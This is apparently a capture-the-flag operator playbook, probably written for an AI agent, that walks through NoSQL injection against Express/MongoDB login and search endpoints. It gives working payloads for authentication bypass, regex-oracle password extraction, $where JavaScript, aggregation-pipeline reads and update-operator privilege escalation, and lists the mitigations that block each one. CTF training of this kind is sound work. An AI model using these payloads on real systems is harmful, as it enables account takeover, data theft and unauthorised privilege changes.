# Workflow deep — the full operator's sequence

## Phase 0 — the recon — the stack-check

```bash
curl -sI http://t/ | grep -iE "server|x-powered"
```

`X-Powered-By: Express` + a `mongo`/`mongoose` dep — the NoSQL stack —
`whitebox-hunt.md`.

## Phase 1 — the carrier-check — which body-shape?

```text
POST /login {"user":"x","pass":"y"}            — JSON?
POST /login user=x&pass=y                       — form?
POST /login user[$ne]=x&pass[$ne]=x             — qs?
GET /search?filter[user][$ne]=x                 — query-qs?
```

`injection-points.md` — the carrier.

## Phase 2 — the differential — the object-vs-scalar

```text
control: {"user":"nosuch","pass":"x"}           → 401
probe:   {"user":{"$ne":null},"pass":{"$ne":null}} → 200?
```

`detection.md` — the differential.

## Phase 3 — the `nosqli_probe` — the matrix

```bash
python3 tools/web/nosqli_probe.py --url "http://t/login" --json \
  --user-field user --pass-field pass \
  --good-user test --good-pass test
```

`tooling.md` — the operator-matrix.

## Phase 4 — the auth-bypass — the `$ne`/`$gt`/`$regex`/`$or`

```json
{"user":{"$ne":null},"pass":{"$ne":null}}    — any user
{"user":"admin","pass":{"$ne":null}}          — targeted
{"user":{"$regex":"^admin"},"pass":{"$ne":null}}  — partial
{"$or":[{"user":"admin"},{"user":"x"}],"pass":{"$ne":null}}  — $or
```

`auth-bypass.md`.

## Phase 5 — the extraction — the oracle-walk

```json
{"pass":{"$regex":"^a"}}        — prefix
{"pass":{"$regex":"^.{20}$"}}   — length
{"pass":{"$gt":"m"}}            — range
{"admin":{"$exists":true}}      — field
{"$expr":{"$regexMatch":{...}}} — $expr
{"user":{"$where":"this.pass[0]=='f'"}}  — $where
```

`extraction.md` / `extraction-deep.md`.

## Phase 6 — the aggregation — the pipeline

```json
[{"$unionWith":"flag"}]
[{"$lookup":{"from":"flag",...}}]
[{"$project":{"flag":1}}]
```

`aggregation.md`.

## Phase 7 — the update — the write-operators

```json
{"$set":{"role":"admin"}}
{"$unset":{"isLocked":""}}
{"$inc":{"balance":9999}}
```

`update-injection.md`.

## Phase 8 — the flag — the verbatim

```bash
python3 tools/hooks.py pre-flag <name> --value "flag{...}" \
  --source "response" --evidence "<excerpt>"
```

`evidence-rules.md`.

## The falsifiers — what closes each branch

- `String(req.body.user)` → `denies` — `denied-conditions.md`
- `sanitizeFilter` → `denies` `$`-path — `filter-bypass.md`
- `enableJs: false` → `denies` `$where` — `operators-js.md`
- `extended: false` → `denies` `qs`-carrier — `injection-points.md`
- a non-existent collection → `inconclusive` `$unionWith` — `aggregation.md`

## The budget — 5/15/25/45

`AGENTS.md` — the escalation order.

## The escalation — budget exhausted

```text
chain_match → reclassify → writeup_search → novel_plan → fanout_sweep → solver_handoff
```

each `state.py --strategy-used <rung>` — `AGENTS.md`.
